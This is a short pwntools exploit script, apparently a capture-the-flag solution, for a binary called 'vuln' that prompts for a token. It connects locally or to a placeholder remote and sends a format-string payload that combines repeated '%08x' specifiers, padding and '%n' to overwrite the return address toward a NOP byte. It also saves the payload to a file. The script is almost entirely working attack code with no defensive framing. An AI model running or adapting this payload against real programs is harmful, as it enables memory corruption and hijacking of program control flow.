#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe
#number of pointer that should be written until arrived to return address.
RA_OFFSET = 12


def conn():
    context.log_level = logging.INFO

    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    log.info("starting to solve")
    r.recvuntil(b"portfolio\n")
    r.sendline(b"1")
    r.recvuntil(b"token?\n")

    # Set printf arguments pointer to return address-1.
    payload = "%08x"*(RA_OFFSET-1)
    # nop instruction opcode is 0x90
    align_to_nop = 0x90 - ((RA_OFFSET-1)*8)
    payload += f"%0{align_to_nop}x"
    payload += "%n"
    log.info(f"align to nop is : {align_to_nop}")
    
    r.sendline(payload.encode())
    with open("payload", "wb") as output:
        output.write(b"1\n" + payload.encode())

    r.recvline()
    output = r.recvline()
    log.info(f"output is : {output}")
    r.recvline()


if __name__ == "__main__":
    main()
